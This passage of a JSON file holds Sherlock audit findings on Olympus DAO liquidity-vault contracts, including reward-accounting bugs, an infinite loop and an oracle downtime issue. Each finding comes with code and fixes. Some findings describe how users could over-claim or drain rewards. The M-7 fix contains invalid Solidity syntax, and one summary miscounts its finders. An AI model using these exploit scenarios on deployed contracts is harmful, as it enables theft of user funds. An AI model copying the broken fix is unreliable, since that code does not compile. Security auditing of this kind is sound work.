        "rvierdiiev",
        "favelanky",
        "jonatascm"
      ]
    },
    {
      "id": "6683",
      "title": "M-7: `_accumulateExternalRewards()` could turn into an infinite loop if the check condition is true",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/125 \n\n## Found by \nRaymondFam, shark\n\n## Summary\nIn WstethLiquidityVault.sol, the for loop in `_accumulateExternalRewards()` utilizes `continue` so it could proceed to the next iteration upon having a true condition in the sanity check. This will however turn the function into an infinite loop because `++i` has been included at the end of the loop logic. As a result, this skipped increment leads to the same `externalRewardTokens[i]` repeatedly assigned to `rewardToken` where `newBalance < rewardToken.lastBalance` continues to equal true until the same executions make the gas run out.\n\n## Vulnerability Detail\nHere is a typical scenario:\n\n1. `_accumulateExternalRewards()` gets invoked via one of the functions embedding it, i.e. `claimRewards()`, `_depositUpdateRewardState()` or `_withdrawUpdateRewardState()` of SingleSidedLiquidityVault.sol.\n2. It happens that `newBalance < rewardToken.lastBalance` returns true for a specific reward token.\n3. Because `continue` comes before `++i`, this non-incremented iteration is repeatedly executed till gas is run out.   \n\n## Impact\nThis will persistently cause DOS on `_accumulateExternalRewards()` for all function calls dependent on it. Depending on how big the deficiency is, the situation can only be remedied by:\n\n- having the deficiency of contract balance on this particular reward token separately topped up at the expense of accounting mess up and/or the protocol resorting to a portion of its reward token(s) locked in the contract whenever this incident happens, \n- waiting for a long enough time till the harvested reward is going to be larger than the deficiency entailed, or\n- getting the contract deactivated to temporarily prevent further deposits, withdrawals, or reward claims which will nonetheless break other things when [`deactivate()`](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L663-L667) is called. \n\nNote: The situation could be worse if more than 1 elements in the array `ExternalRewardToken[]` were similarly affected.\n \n## Code Snippet\n\n[File: WstethLiquidityVault.sol#L192-L216](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/WstethLiquidityVault.sol#L192-L216)\n\n```solidity\n    function _accumulateExternalRewards() internal override returns (uint256[] memory) {\n        uint256 numExternalRewards = externalRewardTokens.length;\n\n        auraPool.rewardsPool.getReward(address(this), true);\n\n        uint256[] memory rewards = new uint256[](numExternalRewards);\n        for (uint256 i; i < numExternalRewards; ) {\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 newBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            // This shouldn't happen but adding a sanity check in case\n            if (newBalance < rewardToken.lastBalance) {\n                emit LiquidityVault_ExternalAccumulationError(rewardToken.token);\n                continue;\n            }\n\n            rewards[i] = newBalance - rewardToken.lastBalance;\n            rewardToken.lastBalance = newBalance;\n\n            unchecked {\n                ++i;\n            }\n        }\n        return rewards;\n    }\n```\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider having the affected code logic refactored as follows:\n\n```diff\n    function _accumulateExternalRewards() internal override returns (uint256[] memory) {\n        uint256 numExternalRewards = externalRewardTokens.length;\n\n        auraPool.rewardsPool.getReward(address(this), true);\n\n        uint256[] memory rewards = new uint256[](numExternalRewards);\n\n+    unchecked {\n-        for (uint256 i; i < numExternalRewards; ) {\n+        for (uint256 i; i < numExternalRewards; ++i;) {\n            ExternalRewardToken storage rewardToken = externalRewardTokens[i];\n            uint256 newBalance = ERC20(rewardToken.token).balanceOf(address(this));\n\n            // This shouldn't happen but adding a sanity check in case\n            if (newBalance < rewardToken.lastBalance) {\n                emit LiquidityVault_ExternalAccumulationError(rewardToken.token);\n                continue;\n            }\n\n            rewards[i] = newBalance - rewardToken.lastBalance;\n            rewardToken.lastBalance = newBalance;\n\n-            unchecked {\n-                ++i;\n-            }\n        }\n+    }\n        return rewards;\n    }\n```\nThis will safely increment `i` when `continue` is hit and move on to the next `i + 1` iteration while still having SafeMath unchecked for the entire scope of the for loop.",
      "summary": "\nThis bug report is about an issue found in the WstethLiquidityVault.sol file of the Sherlock Audit 2023-02-Olympus-Judging repository. The issue is that the for loop in the `_accumulateExternalRewards()` function utilizes `continue` so it could proceed to the next iteration upon having a true condition in the sanity check. This will however turn the function into an infinite loop because `++i` has been included at the end of the loop logic. As a result, this skipped increment leads to the same `externalRewardTokens[i]` repeatedly assigned to `rewardToken` where `newBalance < rewardToken.lastBalance` continues to equal true until the same executions make the gas run out.\n\nThis will persistently cause DOS on `_accumulateExternalRewards()` for all function calls dependent on it. Depending on how big the deficiency is, the situation can only be remedied by having the deficiency of contract balance on this particular reward token separately topped up, waiting for a long enough time till the harvested reward is going to be larger than the deficiency entailed, or getting the contract deactivated to temporarily prevent further deposits, withdrawals, or reward claims. The situation could be worse if more than 1 elements in the array `ExternalRewardToken[]` were similarly affected.\n\nThe bug was found by RaymondFam and shark and was manually reviewed. The recommendation is to consider having the affected code logic refactored with `++i` safely incremented when `continue` is hit and move on to the next `i + 1` iteration while still having SafeMath unchecked for the entire scope of the for loop.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/125",
      "tags": [],
      "finders": [
        "shark",
        "RaymondFam"
      ]
    },
    {
      "id": "6682",
      "title": "M-6: Removed reward tokens will no longer be claimable and will cause loss of funds to users who haven't claimed",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/127 \n\n## Found by \nCryptor, CRYP70, kiki\\_dev, Bauer, hansfriese, HonorLt, gerdusx, KingNFT, 0x52, Ruhum, rvierdiiev\n\n## Summary\n\nWhen a reward token is removed, it's entire reward structs is deleted from the reward token array. The results is that after it has been removed it is impossible to claim. User's who haven't claimed will permanently lose all their unclaimed rewards.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L694-L703\n\nWhen a reward token is removed the entire reward token struct is deleted from the array\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L288-L310\n\nWhen claiming rewards it cycles through the current reward token array and claims each token. As a result of this, after a reward token has been removed it becomes impossible to claim. Any unclaimed balance that a user had will be permanently lost.\n\nSubmitting this as high because the way that internal tokens are accrued (see \"Internal reward tokens can and likely will over commit rewards\") will force this issue and therefore loss of funds to users to happen.\n\n## Impact\n\nUsers will lose all unclaimed rewards when a reward token is removed\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L694-L703\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L723-L732\n\n## Tool used\n\nChatGPT\n\n## Recommendation\n\nWhen a reward token is removed it should be moved into a \"claim only\" mode. In this state rewards will no longer accrue but all outstanding balances will still be claimable.",
      "summary": "\nThis bug report is about a vulnerability that can cause users to lose unclaimed rewards when a reward token is removed. This vulnerability is found in the SingleSidedLiquidityVault.sol code, which is used to manage rewards tokens. The code cycles through the current reward token array and claims each token. When a reward token is removed, its entire reward struct is deleted from the array, making it impossible to claim any unclaimed rewards for that token. As a result, any unclaimed balance that a user had will be permanently lost. The bug was found by Cryptor, CRYP70, kiki_dev, Bauer, hansfriese, HonorLt, gerdusx, KingNFT, 0x52, Ruhum, and rvierdiiev, and was identified as high priority due to the potential for users to lose funds. The recommended solution is to move the reward token into a \"claim only\" mode when it is removed, so that rewards will no longer accrue but all outstanding balances will still be claimable.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/127",
      "tags": [],
      "finders": [
        "Cryptor",
        "Bauer",
        "0x52",
        "Ruhum",
        "KingNFT",
        "kiki\\_dev",
        "hansfriese",
        "HonorLt",
        "CRYP70",
        "rvierdiiev",
        "gerdusx"
      ]
    },
    {
      "id": "6681",
      "title": "M-5: Internal reward tokens can and likely will over commit rewards",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/128 \n\n## Found by \ntives, Bahurum, 0xlmanini, minhtrng, 0x52\n\n## Summary\n\nInternal reward tokens accrue indefinitely with no way to change the amount that they accrue each block (besides removing them which has other issues) or input a timestamp that they stop accruing. Additionally there is no check that the contract has enough tokens to fund the rewards that it has committed to. As a result of this the contract may over commit reward tokens and after the token balance of the contract has been exhausted, all further claims will fail.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L674-L688\n\nInternal reward tokens are added with a fixed _rewardPerSecond that will accrue indefinitely because it does not have an ending timestamp. As a result the contract won't stop accruing internal rewards even if it has already designated it's entire token balance. After it has over committed it will now be impossible for all users to claim their balance. Additionally claiming rewards is an all or nothing function meaning that once a single reward token starts reverting, it becomes impossible to claim any rewards at all.\n\n## Impact\n\nInternal reward tokens can over commit and break claiming of all reward tokens\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L674-L688\n\n## Tool used\n\nChatGPT\n\n## Recommendation\n\nI recommend adding an end timestamp to the accrual of internal tokens. Additionally, the amount of tokens needed to fund the internal tokens should be transferred from the caller (or otherwise tracked) when the token is added.",
      "summary": "\nThis bug report is about an issue found in the SingleSidedLiquidityVault.sol contract. The issue is that internal reward tokens accrue indefinitely, with no way to input a timestamp that they stop accruing, and no check that the contract has enough tokens to fund the rewards that it has committed to. As a result, the contract may over commit reward tokens and after the token balance of the contract has been exhausted, all further claims will fail. This could lead to users being unable to claim their rewards. The bug was found by tives, Bahurum, 0xlmanini, minhtrng, and 0x52, who used ChatGPT to identify the issue. The recommended solution is to add an end timestamp to the accrual of internal tokens, and to transfer the amount of tokens needed to fund the internal tokens from the caller when the token is added.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/128",
      "tags": [],
      "finders": [
        "0x52",
        "Bahurum",
        "0xlmanini",
        "tives",
        "minhtrng"
      ]
    },
    {
      "id": "6680",
      "title": "M-4: Reward tokens can never be added again once they are removed without breaking rewards completely",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/177 \n\n## Found by \ncccz, cducrest-brainbot, 0x52, hansfriese\n\n## Summary\n\nOnce reward tokens are removed they can never be added back to the contract. The happens because accumulated rewards are tracked differently globally vs individually. Global accumulated rewards are tracked inside the rewardToken array whereas it is tracked by token address for users. When a reward token is removed the global tracker is cleared but the individual trackers are not. If a removed token is added again, the global tracker will reset to zero but the individual tracker won't. As a result of this claiming will fail due to an underflow.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L491-L493\n\nThe amount of accumulated rewards for a specific token is tracked in it's respective rewardToken struct. \n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L624-L629\n\nFor individual users the rewards are stored in a mapping.\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L694-L703\n\nWhen a reward token is removed the global tracker for the accumulated rewards is also removed. The problem is that the individual mapping still stores the previously accumulated rewards. If the token is ever added again, the global accumulated reward tracker will now be reset but the individual trackers will not. This will cause an underflow anytime a user tries to claim reward tokens. \n\n## Impact\n\nReward tokens cannot be added again once they are removed\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L674-L687\n\n## Tool used\n\nChatGPT\n\n## Recommendation\n\nConsider tracking accumulatedRewardsPerShare in a mapping rather than in the individual struct or change how removal of reward tokens works",
      "summary": "\nThis bug report is about an issue with the reward token system in the contract. When a reward token is removed, the global tracker for the accumulated rewards is also removed, but the individual mapping still stores the previously accumulated rewards. If the token is ever added again, the global accumulated reward tracker will now be reset but the individual trackers will not. This will cause an underflow anytime a user tries to claim reward tokens, meaning reward tokens can never be added again once they are removed. The code snippet in the report can be found at https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L674-L687 and the tool used was ChatGPT. The recommendation for this issue is to consider tracking accumulatedRewardsPerShare in a mapping rather than in the individual struct or to change how removal of reward tokens works.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/177",
      "tags": [],
      "finders": [
        "cccz",
        "cducrest-brainbot",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "6679",
      "title": "M-3: freezing user rewards for a while",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/187 \n\n## Found by \ncccz, mahdikarimi, ABA, xAlismx, GimelSec, Ruhum\n\n## Summary\nWhen a user claims some cached rewards it's possible that rewards be freezed for a while . \n## Vulnerability Detail\nthe following line in internalRewardsForToken function can revert because already claimed rewards has been added to debt so if amount of debt be higher than accumulated rewards for user LP shares it will revert before counting cached rewards value so user should wait until earned rewards as much as last time he/she claimed rewards to be able claim it . \n`uint256 totalAccumulatedRewards = (lpPositions[user_] * accumulatedRewardsPerShare) - userRewardDebts[user_][rewardToken.token];`\n## Impact\nuser rewards will be locked for a while \n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L354-L372\n## Tool used\n\nManual Review\n\n## Recommendation\nadd cached rewards to total rewards like the following line \n`uint256 totalAccumulatedRewards = (lpPositions[user_] * accumulatedRewardsPerShare + cachedUserRewards[user_][rewardToken.token] ) - userRewardDebts[user_][rewardToken.token];`",
      "summary": "\nThis bug report is related to freezing user rewards. It was found by five people: cccz, mahdikarimi, ABA, xAlismx, GimelSec, and Ruhum. When a user claims some cached rewards, it is possible that their rewards will be frozen for a while. The issue is caused by a line of code in the internalRewardsForToken function, which can revert if the amount of debt is higher than the accumulated rewards for the user LP shares. This means that the user must wait until they have earned the same amount of rewards as the last time they claimed rewards in order to be able to claim them. The impact of this bug is that user rewards will be locked for a while. The code snippet and recommendation for fixing this issue are provided in the report. The tool used for this report was manual review. The recommendation for fixing this issue is to add the cached rewards to the total rewards in the code.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/187",
      "tags": [],
      "finders": [
        "cccz",
        "ABA",
        "Ruhum",
        "mahdikarimi",
        "xAlismx",
        "GimelSec"
      ]
    },
    {
      "id": "6678",
      "title": "M-2: Vault can experience long downtime periods",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/210 \n\n## Found by \nBahurum\n\n## Summary\nThe chainlink price could stay up to 24 hours (heartbeat period) outside the boundaries defined by `THRESHOLD` but within the chainlink deviation threshold. Deposits and withdrawals will not be possible during this period of time.\n\n## Vulnerability Detail\nThe `_isPoolSafe()` function checks if the balancer pool spot price is within the boundaries defined by `THRESHOLD` respect to the last fetched chainlink price. \n\nSince in `_valueCollateral()` the `updateThreshold` should be 24 hours (as in the tests), then the OHM derived oracle price could stay at up to 2% from the on-chain trusted price. The value is 2% because in [WstethLiquidityVault.sol#L223](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/WstethLiquidityVault.sol#L223):\n```solidity\nreturn (amount_ * stethPerWsteth * stethUsd * decimalAdjustment) / (ohmEth * ethUsd * 1e18);\n```\n`stethPerWsteth` is mostly stable and changes in `stethUsd` and `ethUsd` will cancel out, so the return value changes will be close to changes in `ohmEth`, so up to 2% from the on-chain trusted price.\n\nIf `THRESHOLD` < 2%, say 1% as in the tests, then the Chainlink price can deviate by more than 1% from the pool spot price and less than 2% from the on-chain trusted price fro up to 24 h. During this period withdrawals and deposits will revert.\n\n## Impact\nWithdrawals and deposits can be often unavailable for several hours.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L411-L421\n\n## Tool used\n\nManual Review\n\n## Recommendation\n`THRESHOLD` is not fixed and can be changed by the admin, meaning that it can take different values over time.Only a tight range of values around 2% should be allowed to avoid the scenario above.",
      "summary": "\nThis bug report is about an issue where the Vault can experience long downtime periods due to the `_isPoolSafe()` function checking if the balancer pool spot price is within the boundaries defined by `THRESHOLD` respect to the last fetched chainlink price. If `THRESHOLD` is less than 2%, then the Chainlink price can deviate by more than 1% from the pool spot price and less than 2% from the on-chain trusted price for up to 24 hours. During this period, withdrawals and deposits will not be possible. The impact of this issue is that withdrawals and deposits can be often unavailable for several hours. The bug was found by Bahurum and was identified through manual review. The recommended solution is to ensure that `THRESHOLD` is only allowed to take a tight range of values around 2% to avoid this issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/210",
      "tags": [],
      "finders": [
        "Bahurum"
      ]
    },
    {
      "id": "6677",
      "title": "M-1: rescueToken doesn't update rewardToken.lastBalance for external reward tokens",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/222 \n\n## Found by \n0x52\n\n## Summary\n\nSingleSidedLiquidityVault allows the admin tokens from the vault contract. This can only be done once the vault has been deactivated but there is nothing stopping the contract from being reactivated after a token has been rescued. If an external reward token is rescued then the token accounting will be permanently broken after when/if the vault is re-enabled.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nExternal reward tokens are broken after being rescued\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L774-L780\n\n## Tool used\n\nChatGPT\n\n## Recommendation\n\nIf the token being rescued is an external reward token then rescueToken should update rewardToken.lastBalance",
      "summary": "\nThis bug report is about a vulnerability found in the SingleSidedLiquidityVault contract which allows the admin tokens from the vault contract to be used once the vault has been deactivated. The issue is that if an external reward token is rescued then the token accounting will be permanently broken after when/if the vault is re-enabled. The code snippet linked in the report shows how the rescueToken function does not update the rewardToken.lastBalance for external reward tokens. The impact of this vulnerability is that external reward tokens are broken after being rescued. The tool used to find this vulnerability was ChatGPT. The recommendation is that if the token being rescued is an external reward token then rescueToken should update rewardToken.lastBalance.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/222",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6676",
      "title": "H-4: User can receive more rewards through a mistake in the withdrawal logic",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/13 \n\n## Found by \njoestakey, cccz, usmannk, Bahurum, Dug, ABA, psy4n0n, chaduke, carrot, minhtrng, jonatascm, GimelSec, ak1, RaymondFam, Ruhum, rvierdiiev\n\n## Summary\nIn the `withdraw()` function of the SingleSidedLiquidityVault the contract updates the reward state. Because of a mistake in the calculation, the user is assigned more rewards than they're supposed to.\n\n## Vulnerability Detail\nWhen a user withdraws their funds, the `_withdrawUpdateRewardState()` function checks how many rewards those LP shares generated. If that amount is higher than the actual amount of reward tokens that the user claimed, the difference between those values is cached and the amount the user claimed is set to 0. That way they receive the remaining shares the next time they claim.\n\nBut, the contract resets the number of reward tokens the user claimed *before* it computes the difference. That way, the full amount of reward tokens the LP shares generated are added to the cache.\n\nHere's an example:\n1. Alice deposits funds and receives 1e18 shares\n2. Alice receives 1e17 rewards and claims those funds immediately\n3. Time passes and Alice earns 5e17 more reward tokens\n4. Instead of claiming those tokens, Alice withdraws 5e17 (50% of her shares)\nThat executes `_withdrawUpdateRewardState()` with `lpAmount_ = 5e17` and `claim = false`:\n```sol\n    function _withdrawUpdateRewardState(uint256 lpAmount_, bool claim_) internal {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256 numExternalRewardTokens = externalRewardTokens.length;\n\n        // Handles accounting logic for internal and external rewards, harvests external rewards\n        uint256[] memory accumulatedInternalRewards = _accumulateInternalRewards();\n        uint256[] memory accumulatedExternalRewards = _accumulateExternalRewards();\n        for (uint256 i; i < numInternalRewardTokens;) {\n            _updateInternalRewardState(i, accumulatedInternalRewards[i]);\n            if (claim_) _claimInternalRewards(i);\n\n            // Update reward debts so as to not understate the amount of rewards owed to the user, and push\n            // any unclaimed rewards to the user's reward debt so that they can be claimed later\n            InternalRewardToken memory rewardToken = internalRewardTokens[i];\n            // @audit In our example, rewardDebtDiff = 3e17 (total rewards are 6e17 so 50% of shares earned 50% of reward tokens)\n            uint256 rewardDebtDiff = lpAmount_ * rewardToken.accumulatedRewardsPerShare;\n\n            // @audit 3e17 > 1e17\n            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {\n\n                // @audit userRewardDebts is set to 0 (original value was 1e17, the number of tokens that were already claimed)\n                userRewardDebts[msg.sender][rewardToken.token] = 0;\n                // @audit cached amount = 3e17 - 0 = 3e17.\n                // Alice is assigned 3e17 reward tokens to be distributed the next time they claim\n                // The remaining 3e17 LP shares are worth another 3e17 reward tokens.\n                // Alice already claimed 1e17 before the withdrawal.\n                // Thus, Alice receives 7e17 reward tokens instead of 6e17\n                cachedUserRewards[msg.sender][rewardToken.token] +=\n                    rewardDebtDiff - userRewardDebts[msg.sender][rewardToken.token];\n            } else {\n                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n```\n\n## Impact\nA user can receive more reward tokens than they should by abusing the withdrawal system.\n\n## Code Snippet\nThe issue is that `userRewardDebts` is set to `0` before it's used in the calculation of `cachedUserRewards`: https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L566-L619\n```sol\n    function _withdrawUpdateRewardState(uint256 lpAmount_, bool claim_) internal {\n        uint256 numInternalRewardTokens = internalRewardTokens.length;\n        uint256 numExternalRewardTokens = externalRewardTokens.length;\n\n        // Handles accounting logic for internal and external rewards, harvests external rewards\n        uint256[] memory accumulatedInternalRewards = _accumulateInternalRewards();\n        uint256[] memory accumulatedExternalRewards = _accumulateExternalRewards();\n\n        for (uint256 i; i < numInternalRewardTokens; ) {\n            _updateInternalRewardState(i, accumulatedInternalRewards[i]);\n            if (claim_) _claimInternalRewards(i);\n\n            // Update reward debts so as to not understate the amount of rewards owed to the user, and push\n            // any unclaimed rewards to the user's reward debt so that they can be claimed later\n            InternalRewardToken memory rewardToken = internalRewardTokens[i];\n            uint256 rewardDebtDiff = lpAmount_ * rewardToken.accumulatedRewardsPerShare;\n\n            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {\n                userRewardDebts[msg.sender][rewardToken.token] = 0;\n                cachedUserRewards[msg.sender][rewardToken.token] +=\n                    rewardDebtDiff -\n                    userRewardDebts[msg.sender][rewardToken.token];\n            } else {\n                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        for (uint256 i; i < numExternalRewardTokens; ) {\n            _updateExternalRewardState(i, accumulatedExternalRewards[i]);\n            if (claim_) _claimExternalRewards(i);\n\n            // Update reward debts so as to not understate the amount of rewards owed to the user, and push\n            // any unclaimed rewards to the user's reward debt so that they can be claimed later\n            ExternalRewardToken memory rewardToken = externalRewardTokens[i];\n            uint256 rewardDebtDiff = lpAmount_ * rewardToken.accumulatedRewardsPerShare;\n\n            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {\n                userRewardDebts[msg.sender][rewardToken.token] = 0;\n                cachedUserRewards[msg.sender][rewardToken.token] +=\n                    rewardDebtDiff -\n                    userRewardDebts[msg.sender][rewardToken.token];\n            } else {\n                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\nFirst calculate `cachedUserRewards` then reset `userRewardDebts`.",
      "summary": "\nA bug was discovered in the `withdraw()` function of the SingleSidedLiquidityVault contract, which is part of the Sherlock Audit's 2023-02-olympus-judging project. This bug allows users to receive more rewards than they should by manipulating the withdrawal system.\n\nThe bug occurs when a user withdraws their funds and the `_withdrawUpdateRewardState()` function is executed. This function checks how many rewards the LP shares generated and if that amount is higher than the amount of reward tokens the user claimed, the difference between those values is cached and the amount the user claimed is set to 0.\n\nHowever, the contract resets the number of reward tokens the user claimed *before* it computes the difference. This means the full amount of reward tokens the LP shares generated are added to the cache, which means the user receives more rewards than they should.\n\nThe bug was found by joestakey, cccz, usmannk, Bahurum, Dug, ABA, psy4n0n, chaduke, carrot, minhtrng, jonatascm, GimelSec, ak1, RaymondFam, Ruhum, and rvierdiiev. It was discovered through manual review and the code snippet can be found at https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L566-L619.\n\nThe recommendation to fix the bug is to first calculate `cachedUserRewards` then reset `userRewardDebts`.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/13",
      "tags": [],
      "finders": [
        "Bahurum",
        "psy4n0n",
        "cccz",
        "ABA",
        "Dug",
        "joestakey",
        "RaymondFam",
        "Ruhum",
        "usmannk",
        "GimelSec",
        "chaduke",
        "ak1",
        "rvierdiiev",
        "minhtrng",
        "jonatascm",
        "carrot"
      ]
    },
    {
      "id": "6675",
      "title": "H-3: cachedUserRewards variable is never reset, so user can steal all rewards",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/43 \n\n## Found by \nCRYP70, ABA, ast3ros, nobody2018, minhtrng, saian, jonatascm, KingNFT, cducrest-brainbot, Ruhum, rvierdiiev\n\n## Summary\ncachedUserRewards variable is never reset, so user can steal all rewards\n## Vulnerability Detail\nWhen user wants to withdraw then `_withdrawUpdateRewardState` function is called.\nThis function updates internal reward state and claims rewards for user if he provided `true` as `claim_` param.\n\nIn case if user didn't want to claim, and `rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]`  then `cachedUserRewards` variable will be set for him which will allow him to claim that amount later.\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L583-L590\n```solidity\n            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {\n                userRewardDebts[msg.sender][rewardToken.token] = 0;\n                cachedUserRewards[msg.sender][rewardToken.token] +=\n                    rewardDebtDiff -\n                    userRewardDebts[msg.sender][rewardToken.token];\n            } else {\n                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;\n            }\n```\n\nWhen user calls claimRewards, then `cachedUserRewards` variable [is added to the rewards](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L371) he should receive.\nThe problem is that `cachedUserRewards` variable is never reset to 0, once user claimed that amount.\n\nBecause of that he can claim multiple times in order to receive all balance of token.\n## Impact\nUser can steal all rewards\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nOnce user received rewards, reset `cachedUserRewards` variable to 0. This can be done inside `_claimInternalRewards` function.\n\n## Discussion\n\n**0xLienid**\n\nThis should be high severity",
      "summary": "\nThis bug report is about the vulnerability found in the code of the SingleSidedLiquidityVault.sol contract which is part of the Olympus project. It was found by 11 people: CRYP70, ABA, ast3ros, nobody2018, minhtrng, saian, jonatascm, KingNFT, cducrest-brainbot, Ruhum, rvierdiiev. \n\nThe vulnerability is related to the `cachedUserRewards` variable which is never reset, so user can steal all rewards. This happens when user wants to withdraw and `rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]`. In this case, the `cachedUserRewards` variable will be set for him and he can claim that amount later. When user calls claimRewards, then `cachedUserRewards` variable is added to the rewards he should receive. The problem is that `cachedUserRewards` variable is never reset to 0, once user claimed that amount. This allows the user to claim multiple times in order to receive all balance of token.\n\nThe impact of this vulnerability is that user can steal all rewards. \n\nThe recommendation to fix this issue is to reset `cachedUserRewards` variable to 0 once user received rewards, which can be done inside `_claimInternalRewards` function. \n\nThe severity of this vulnerability was marked as high.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/43",
      "tags": [],
      "finders": [
        "ABA",
        "cducrest-brainbot",
        "Ruhum",
        "KingNFT",
        "saian",
        "nobody2018",
        "CRYP70",
        "rvierdiiev",
        "minhtrng",
        "jonatascm",
        "ast3ros"
      ]
    },
    {
      "id": "6674",
      "title": "H-2: Adversary can economically exploit wstETHLiquidityVault",
